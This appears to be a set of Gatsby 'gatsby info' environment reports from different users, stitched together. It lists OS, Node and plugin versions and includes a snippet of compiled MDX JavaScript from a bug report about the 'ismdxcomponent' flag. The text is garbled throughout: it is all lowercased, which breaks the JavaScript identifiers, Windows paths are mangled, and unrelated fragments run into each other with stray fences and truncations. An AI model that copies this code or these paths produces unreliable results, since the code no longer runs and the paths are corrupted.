system: os: windows 10 10.0.17134 cpu: (4) x64 intel(r) core(tm) i3-4150 cpu @ 3.50ghz binaries: node: 10.16.0 - c:\\program files\ odejs\ ode.exe npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.13 browsers: edge: 42.17134.1098.0 npmpackages: gatsby: ^2.20.27 => 2.20.27 gatsby-image: ^2.3.4 => 2.3.4 gatsby-plugin-i18n: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.3.5 => 2.3.5 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-sass: ^2.2.3 => 2.2.3 gatsby-plugin-sharp: ^2.5.6 => 2.5.6 gatsby-source-filesystem: ^2.2.4 => 2.2.4 gatsby-source-prismic-graphql: ^3.5.0 => 3.5.0 gatsby-transformer-sharp: ^2.4.6 => 2.4.6
~/website$ node_modules/.bin/gatsby info --clipboard system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (1) x64 intel(r) xeon(r) cpu e5-2676 v3 @ 2.40ghz shell: 4.4.20 - /bin/bash binaries: node: 13.13.0 - /usr/bin/node npm: 6.14.4 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.19.39 => 2.20.25 gatsby-plugin-manifest: ^2.2.31 => 2.3.5 gatsby-plugin-offline: ^3.0.26 => 3.1.4 gatsby-plugin-typescript: ^2.3.1 => 2.3.3 gatsby-source-graphql: ^2.4.2 => 2.4.2
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 12.15.0 - ~/.nvm/versions/node/v12.15.0/bin/node npm: 6.13.4 - ~/.nvm/versions/node/v12.15.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 12.1.2 npmpackages: gatsby: ^2.10.0 => 2.20.9 gatsby-image: ^2.2.1 => 2.3.1 gatsby-plugin-canonical-urls: ^2.1.0 => 2.2.1 gatsby-plugin-create-client-paths: ^2.2.1 => 2.2.1 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.0 => 3.2.1 gatsby-plugin-react-redux: ^1.1.0-0 => 1.1.0-0 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.2.1 => 2.5.3 gatsby-plugin-typescript: ^2.1.0 => 2.3.1 gatsby-remark-copy-linked-files: ^2.1.0 => 2.2.1 gatsby-remark-images: ^3.1.0 => 3.2.1 gatsby-remark-prismjs: ^3.3.0 => 3.4.1 gatsby-remark-smartypants: ^2.1.0 => 2.2.1 gatsby-source-filesystem: ^2.1.0 => 2.2.2 gatsby-transformer-json: ^2.2.0 => 2.3.1 gatsby-transformer-remark: ^2.5.0 => 2.7.1 gatsby-transformer-sharp: ^2.2.0 => 2.4.3 npmglobalpackages: gatsby-cli: 2.10.4
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - ~/.nvm/versions/node/v13.12.0/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v13.12.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.113 firefox: 72.0.2 safari: 13.0.5 npmpackages: gatsby: ^2.20.23 => 2.20.23 gatsby-image: ^2.3.3 => 2.3.3 gatsby-plugin-google-analytics: ^2.2.3 => 2.2.3 gatsby-plugin-manifest: ^2.3.4 => 2.3.4 gatsby-plugin-netlify: ^2.2.2 => 2.2.2 gatsby-plugin-react-helmet: ^3.2.3 => 3.2.3 gatsby-plugin-sharp: ^2.5.5 => 2.5.5 gatsby-plugin-styled-components: ^3.2.2 => 3.2.2 gatsby-plugin-typescript: ^2.3.2 => 2.3.2 gatsby-source-contentful: ^2.2.8 => 2.2.8 gatsby-source-filesystem: ^2.2.3 => 2.2.3 gatsby-transformer-sharp: ^2.4.5 => 2.4.5
``` ### related
acer@acer-supermars mingw64 ~
$ gatsby info --clipboard
bash: gatsby: command not found
``` i run windows 10 with git bash
system: os: linux 4.15 ubuntu 16.04.6 lts (xenial xerus) cpu: (4) x64 intel(r) core(tm) i5-6300hq cpu @ 2.30ghz shell: 4.3.48 - /bin/bash binaries: node: 13.7.0 - ~/.nvm/versions/node/v13.7.0/bin/node npm: 6.14.3 - ~/.nvm/versions/node/v13.7.0/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: chrome: 81.0.4044.92 firefox: 75.0 npmpackages: gatsby: ^2.20.23 => 2.20.23 gatsby-background-image: ^0.10.2 => 0.10.2 gatsby-image: ^2.3.3 => 2.3.3 gatsby-plugin-manifest: ^2.3.4 => 2.3.4 gatsby-plugin-playground: ^1.0.6 => 1.0.6 gatsby-plugin-react-helmet: ^3.2.3 => 3.2.3 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.2.3 => 2.2.3 gatsby-plugin-sharp: ^2.5.5 => 2.5.5 gatsby-plugin-sitemap: ^2.3.3 => 2.3.3 gatsby-plugin-styled-components: ^3.2.2 => 3.2.2 gatsby-plugin-transition-link: ^1.18.0 => 1.18.0 gatsby-source-contentful: ^2.2.8 => 2.2.8 gatsby-source-filesystem: ^2.2.3 => 2.2.3 gatsby-transformer-sharp: ^2.4.5 => 2.4.5 npmglobalpackages: gatsby-cli: 2.11.11
``` system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: node: 12.16.1 - c:\\program files\ odejs\ ode.exe yarn: 1.17.3 - c:\\users\\pauan\\appdata\ oaming\ pm\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.20.12 => 2.20.23 ```
``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.113 firefox: 74.0.1 safari: 13.1 npmglobalpackages: gatsby-cli: 2.11.10
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-6700 cpu @ 3.40ghz binaries: node: 12.13.0 - c:\\program files\ odejs\ ode.exe yarn: 1.19.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.12.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.28 => 2.20.23 gatsby-image: ^2.2.42 => 2.3.3 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-firebase: ^0.2.0-beta.4 => 0.2.0-beta.4 gatsby-plugin-manifest: ^2.2.42 => 2.3.4 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-postcss: ^2.1.20 => 2.2.2 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.4.5 => 2.5.5 gatsby-source-filesystem: ^2.1.48 => 2.2.3 gatsby-transformer-sharp: ^2.3.16 => 2.4.5
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.8.1 - ~/.nvm/versions/node/v12.8.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.10.2 - ~/.nvm/versions/node/v12.8.1/bin/npm languages: python: 2.7.13 - /usr/local/bin/python browsers: chrome: 81.0.4044.113 firefox: 74.0.1 safari: 13.1 npmpackages: gatsby: ^2.16.1 => 2.16.1 gatsby-image: ^2.2.29 => 2.2.29 gatsby-plugin-manifest: ^2.2.23 => 2.2.23 gatsby-plugin-mdx: ^1.0.52 => 1.0.52 gatsby-plugin-offline: ^3.0.16 => 3.0.16 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-sharp: ^2.2.31 => 2.2.31 gatsby-plugin-styled-components: ^3.1.11 => 3.1.11 gatsby-remark-copy-linked-files: ^2.1.28 => 2.1.28 gatsby-remark-images: ^3.1.28 => 3.1.28 gatsby-remark-prismjs: ^3.3.20 => 3.3.20 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-transformer-sharp: ^2.2.23 => 2.2.23
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-4670 cpu @ 3.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /usr/local/bin/node npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 80.0.3987.163 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-react-helmet: ^3.2.2 => 3.2.2 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-csv: ^2.2.1 => 2.2.1 gatsby-transformer-json: ^2.3.1 => 2.3.1 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.5.12 test repo:
``` system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 3.1.0 - /usr/local/bin/fish binaries: node: 13.13.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 3.8.0 - /users/ochronus/.pyenv/shims/python browsers: chrome: 81.0.4044.113 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.19.49 => 2.19.49 gatsby-cli: ^2.11.9 => 2.11.9 gatsby-image: ^2.3.3 => 2.3.3 gatsby-plugin-canonical-urls: ^2.2.2 => 2.2.2 gatsby-plugin-draft: 0.0.5 => 0.0.5 gatsby-plugin-feed: ^2.4.2 => 2.4.2 gatsby-plugin-google-analytics: ^2.1.38 => 2.1.38 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-netlify: ^2.2.2 => 2.2.2 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-react-helmet: ^3.2.3 => 3.2.3 gatsby-plugin-s3: ^0.3.3 => 0.3.3 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-sitemap: ^2.3.3 => 2.3.3 gatsby-plugin-typography: ^2.4.2 => 2.4.2 gatsby-remark-copy-linked-files: ^2.2.1 => 2.2.1 gatsby-remark-images: ^3.2.1 => 3.2.1 gatsby-remark-prismjs: ^3.3.36 => 3.3.36 gatsby-remark-responsive-iframe: ^2.3.1 => 2.3.1 gatsby-remark-smartypants: ^2.2.2 => 2.2.2 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.7.1 => 2.7.1 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.11.9
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.5.0 - ~/.nvm/versions/node/v13.5.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.2 - ~/.nvm/versions/node/v13.5.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12 npmglobalpackages: gatsby-cli: 2.11.9
gatsby info --clipboard system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.8.1 - ~/.nvm/versions/node/v12.8.1/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.10.2 - ~/.nvm/vers
``` ### more info/thoughts if you `console.log` the contents of `mdx.body`, you can clearly see the `mdxcontent.ismdxcomponent = true;` statement _after_ `return function mdxcontent`: ```js
function _extends() { _extends = object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (object.prototype.hasownproperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); } function _objectwithoutproperties(source, excluded) { if (source == null) return {}; var target = _objectwithoutpropertiesloose(source, excluded); var key, i; if (object.getownpropertysymbols) { var sourcesymbolkeys = object.getownpropertysymbols(source); for (i = 0; i < sourcesymbolkeys.length; i++) { key = sourcesymbolkeys[i]; if (excluded.indexof(key) >= 0) continue; if (!object.prototype.propertyisenumerable.call(source, key)) continue; target[key] = source[key]; } } return target; } function _objectwithoutpropertiesloose(source, excluded) { if (source == null) return {}; var target = {}; var sourcekeys = object.keys(source); var key, i; for (i = 0; i < sourcekeys.length; i++) { key = sourcekeys[i]; if (excluded.indexof(key) >= 0) continue; target[key] = source[key]; } return target; } /* @jsx mdx */
var _frontmatter = { "slug": "/graphql-book", "date": "2018-07-18t13:35:13.234z", "title": "the road to graphql", "description": "graphql description ...", "categories": ["graphql", "javascript"], "keywords": ["graphql", "book"], "banner": "./images/banner.jpg"
}; var makeshortcode = function makeshortcode(name) { return function mdxdefaultshortcode(props) { console.warn("component " + name + " was not imported, exported, or provided by mdxprovider as global scope"); return mdx("div", props); };
}; var link = makeshortcode("link");
var layoutprops = { _frontmatter: _frontmatter
var mdxlayout = "wrapper";
return function mdxcontent(_ref) { var components = _ref.components, props = _objectwithoutproperties(_ref, ["components"]); return mdx(mdxlayout, _extends({}, layoutprops, props, { components: components, mdxtype: "mdxlayout" }), mdx("p", null, "clipped for brevity."), mdx(link, { to: " ", mdxtype: "link" }, "find out more about it"), mdx("p", null, "clipped for brevity."), mdx("p", null, "clipped for brevity."));
mdxcontent.ismdxcomponent = true;
``` this is originally coming from [mdx-js/react]( #ismdxcomponent), mdx-js creates jsx
somehow, somewhere, this is getting transformed into regular js
so, this may belong in a different repo, but i don't have any idea where it would be if it's not here.
system: os: macos mojave 10.14.4 cpu: (8) x64 intel(r) core(tm) i7-4960hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.1 - ~/.nvm/versions/node/v12.13.1/bin/node npm: 6.14.4 - ~/.nvm/versions/node/v12.13.1/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 80.0.3987.163 firefox: 72.0.2 safari: 12.1 npmpackages: gatsby: ^2.19.45 => 2.19.45 gatsby-image: ^2.2.44 => 2.2.44 gatsby-plugin-mailchimp: ^5.1.2 => 5.1.2 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.0.41 => 3.0.41 gatsby-plugin-react-helmet: ^3.1.24 => 3.1.24 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-source-filesystem: ^2.1.56 => 2.1.56 gatsby-source-prismic-graphql: ^3.5.0 => 3.5.0 gatsby-source-wordpress: ^3.2.3 => 3.2.3 gatsby-transformer-remark: ^2.7.1 => 2.7.1 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.11.7
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.12.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-source-graphql: ^2.4.0 => 2.4.0 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 npmglobalpackages: gatsby-cli: 2.11.8
``` system: os: windows 10 10.0.18363 cpu: (4) x64 intel(r) core(tm) i5-6600k cpu @ 3.50ghz binaries: node: 13.10.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.7 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.10.4 => 2.19.19 gatsby-cli: ^2.11.8 => 2.11.8 gatsby-plugin-feed: ^2.3.4 => 2.3.27 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.22 ```
system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm browsers: chrome: 80.0.3987.163 firefox: 73.0.1 safari: 12.0 npmpackages: gatsby: 2.20.21 => 2.20.21 gatsby-image: 2.3.2 => 2.3.2 gatsby-plugin-feed: 2.4.1 => 2.4.1 gatsby-plugin-google-analytics: 2.2.2 => 2.2.2 gatsby-plugin-layout: 1.2.1 => 1.2.1 gatsby-plugin-react-helmet: 3.2.2 => 3.2.2 gatsby-plugin-resolve-src: 2.0.0 => 2.0.0 gatsby-plugin-robots-txt: 1.5.0 => 1.5.0 gatsby-plugin-sharp: 2.5.4 => 2.5.4 gatsby-plugin-sitemap: 2.3.2 => 2.3.2 gatsby-plugin-styled-components: 3.2.1 => 3.2.1 gatsby-remark-images: 3.2.2 => 3.2.2 gatsby-source-filesystem: 2.2.2 => 2.2.2 gatsby-transformer-remark: 2.7.1 => 2.7.1 gatsby-transformer-sharp: 2.4.4 => 2.4.4 ```
system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz shell: 4.4.20 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.1 - /usr/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.17.4 => 2.20.20 gatsby-image: ^2.2.30 => 2.3.2 gatsby-plugin-brotli: ^1.3.1 => 1.3.1 gatsby-plugin-emotion: ^4.1.18 => 4.2.1 gatsby-plugin-manifest: ^2.2.41 => 2.3.3 gatsby-plugin-netlify: ^2.1.32 => 2.2.1 gatsby-plugin-postcss: ^2.1.16 => 2.2.1 gatsby-plugin-prefetch-google-fonts: 1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.13 => 3.2.2 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-remove-fingerprints: 0.0.2 => 0.0.2 gatsby-plugin-resolve-src: ^2.0.0 => 2.0.0 gatsby-plugin-sharp: ^2.2.32 => 2.5.4 gatsby-source-contentful: ^2.1.73 => 2.2.7 gatsby-transformer-remote-filesystem: ^0.2.0 => 0.2.0 gatsby-transformer-sharp: ^2.3.0 => 2.4.4 npmglobalpackages: gatsby-cli: 2.11.8
this is mine but others have encountered it on os x
system: os: linux 4.19 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.18.0 - ~/.nvm/versions/node/v12.16.1/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm
``` system: os: macos mojave 10.14.6 cpu: (16) x64 intel(r) xeon(r) w-2140b cpu @ 3.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.7.0 - ~/.nvm/versions/node/v12.7.0/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.7.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.92 firefox: 74.0 safari: 12.1.2 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-plugin-styled-components: ^3.2.1 => 3.2.1 npmglobalpackages: gatsby-cli: 2.8.29
system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm npmpackages: gatsby: ^2.19.49 => 2.20.15 gatsby-cli: ^2.11.5 => 2.11.5 gatsby-image: ^2.3.1 => 2.3.2 gatsby-plugin-postcss: ^2.2.1 => 2.2.1 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.4 gatsby-remark-images: ^3.2.1 => 3.2.2 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-contentful: ^2.1.19 => 2.2.7 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-source-graphql: 2.1.20 => 2.1.20 gatsby-transformer-remark: ^2.7.1 => 2.7.1 gatsby-transformer-remark-frontmatter: ^0.1.0 => 0.1.0 gatsby-transformer-sharp: ^2.4.3 => 2.4.4 npmglobalpackages: gatsby-advanced-blog: 1.1.4 gatsby-cli: 2.11.4 gatsby-plugin-typography: 2.3.21
``` system: os: linux 5.5 manjaro linux cpu: (4) x64 intel(r) core(tm) i5-3210m cpu @ 2.50ghz shell: 5.8 - /bin/zsh binaries: node: 13.12.0 - /usr/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - /usr/bin/npm languages: python: 3.8.2 - /usr/bin/python browsers: firefox: 75.0 npmpackages: gatsby: ^2.20.18 => 2.20.18 gatsby-background-image: ^0.3.6 => 0.3.6 gatsby-image: ^2.3.2 => 2.3.2 gatsby-plugin-catch-links: ^2.2.1 => 2.2.1 gatsby-plugin-google-tagmanager: ^2.2.1 => 2.2.1 gatsby-plugin-lodash: ^3.2.1 => 3.2.1 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.2.2 => 3.2.2 gatsby-plugin-sass: ^2.2.1 => 2.2.1 gatsby-plugin-sharp: ^2.5.4 => 2.5.4 gatsby-plugin-sitemap: ^2.3.1 => 2.3.1 gatsby-plugin-styled-components: ^3.2.1 => 3.2.1 gatsby-plugin-tslint: 0.0.2 => 0.0.2 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 gatsby-plugin-typography: ^2.4.1 => 2.4.1 gatsby-remark-autolink-headers: ^2.2.1 => 2.2.1 gatsby-remark-copy-images: ^0.2.1 => 0.2.1 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.2.2 => 3.2.2 gatsby-remark-prismjs: ^3.4.1 => 3.4.1 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.7.1 => 2.7.1 gatsby-transformer-sharp: ^2.4.4 => 2.4.4 npmglobalpackages: gatsby-cli: 2.8.27
``` system: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - /var/folders/w2/3l_d4 _385rlkvzk8q_tw0000gn/t/yarn--1586690876653-0.631635444216591/node yarn: 1.22.4 - /var/folders/w2/3l_d4 _385rlkvzk8q_tw0000gn/t/yarn--1586690876653-0.631635444216591/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1
wssl on win10
system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-7500u cpu @ 2.70ghz shell: 4.4.20 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.14.2 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.19.41 => 2.19.41 gatsby-image: ^2.2.43 => 2.2.43 gatsby-paginate: ^1.1.1 => 1.1.1 gatsby-plugin-manifest: ^2.2.47 => 2.2.47 gatsby-plugin-offline: ^3.0.40 => 3.0.40 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.23 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.12 => 2.4.12 gatsby-source-drupal: ^3.3.25 => 3.3.25 gatsby-source-filesystem: ^2.1.54 => 2.1.54 gatsby-transformer-sharp: ^2.3.18 => 2.3.18 npmglobalpackages: gatsby-cli: 2.11.7
#### gatsby env system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 12.8.1 - ~/.nvm/versions/node/v12.8.1/bin/node yarn: 1.22.4 - ~/sources/glowystuff/node_modules/.bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.8.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-cli: ^2.11.5 => 2.11.5 gatsby-image: ^2.3.1 => 2.3.1 gatsby-plugin-google-analytics: ^2.2.2 => 2.2.2 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-netlify: ^2.2.1 => 2.2.1 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-sass: ^2.2.1 => 2.2.1 gatsby-plugin-styled-jsx: ^3.2.1 => 3.2.1 gatsby-plugin-typescript: ^2.3.1 => 2.3.1 gatsby-source-contentful: ^2.2.6 => 2.2.6 gatsby-source-filesystem: ^2.2.2 => 2.2.2 #### package.json
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 13.7.0 - c:\\program files\ odejs\ ode.exe yarn: 1.19.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.1 - /c/python38/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.43 => 2.19.43 gatsby-image: ^2.2.43 => 2.2.43 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-google-analytics: ^2.1.37 => 2.1.37 gatsby-plugin-lodash: ^3.1.21 => 3.1.21 gatsby-plugin-manifest: ^2.2.47 => 2.2.47 gatsby-plugin-offline: ^3.0.40 => 3.0.40 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.23 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.12 => 2.4.12 gatsby-plugin-sitemap: ^2.2.29 => 2.2.29 gatsby-plugin-styled-components: ^3.1.20 => 3.1.20 gatsby-plugin-typography: ^2.3.24 => 2.3.24 gatsby-remark-images: ^3.1.49 => 3.1.49 gatsby-remark-prismjs: ^3.3.35 => 3.3.35 gatsby-source-filesystem: ^2.1.55 => 2.1.55 gatsby-transformer-remark: ^2.6.58 => 2.6.58 gatsby-transformer-sharp: ^2.3.18 => 2.3.18
ystem: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - ~/.nvm/versions/node/v13.12.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v13.12.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.163 firefox: 74.0 safari: 13.1 npmpackages: gatsby: 2.20.14 => 2.20.14 gatsby-plugin-catch-links: 2.2.1 => 2.2.1 gatsby-plugin-manifest: 2.3.3 => 2.3.3 gatsby-plugin-minify-classnames: 0.2.0 => 0.2.0 gatsby-plugin-no-sourcemaps: 2.2.0 => 2.2.0 gatsby-plugin-offline: 3.1.2 => 3.1.2 gatsby-plugin-purgecss: 5.0.0 => 5.0.0 gatsby-plugin-react-helmet: 3.2.1 => 3.2.1 gatsby-plugin-robots-txt: 1.5.0 => 1.5.0 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sitemap: 2.3.1 => 2.3.1 gatsby-plugin-sri: 1.1.0 => 1.1.0 gatsby-plugin-typescript: 2.3.1 => 2.3.1 gatsby-plugin-webpack-bundle-analyser-v2: 1.1.8 => 1.1.8 npmglobalpackages: gatsby: 2.20.10
